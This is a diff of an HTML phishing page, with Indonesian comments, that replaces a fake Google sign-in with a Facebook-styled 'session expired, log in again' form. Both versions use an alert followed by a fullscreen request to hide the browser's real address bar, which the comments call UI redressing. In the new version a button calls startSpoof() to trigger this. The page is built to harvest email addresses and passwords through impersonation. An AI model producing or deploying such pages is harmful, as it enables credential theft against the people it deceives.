@@ -1,31 +1,30 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>Sesi Berakhir</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .login-box { border: 1px solid #dadce0; padding: 20px; display: inline-block; border-radius: 8px; }
-        input { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
+        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); text-align: center; width: 320px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
-
-    <script>
-        // ALERT INI YANG PENTING: Bikin UI nge-freeze pas Address Bar masih Google
-        alert("Sign in to continue"); 
-        
-        // Setelah user klik OK, otomatis minta Fullscreen buat redressing
-        document.documentElement.requestFullscreen();
-    </script>
-
-    <div class="login-box">
-        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
-        <h2>Sign in</h2>
-        <p>Use your Google Account</p>
-        <input type="email" placeholder="Email or phone">
-        <input type="password" placeholder="Enter your password">
-        <button style="background:#1a73e8; color:white; border:none; padding:10px 20px; border-radius:4px; width:100%;">Next</button>
+    <div class="card">
+        <h3>Login Ulang</h3>
+        <p style="color: #606770; font-size: 14px;">Sesi Anda telah berakhir. Masukkan kembali kata sandi Anda.</p>
+        <input type="text" placeholder="Email atau Telepon" />
+        <input type="password" placeholder="Kata Sandi" />
+        <button onclick="startSpoof()">Masuk</button>
     </div>
 
+    <script>
+        function startSpoof() {
+            // Teknik Fullscreen untuk menutupi Address Bar asli (UI Redressing)
+            alert("Sistem Keamanan: Mengaktifkan mode terlindungi.");
+            document.documentElement.requestFullscreen();
+        }
+    </script>
 </body>
 </html>
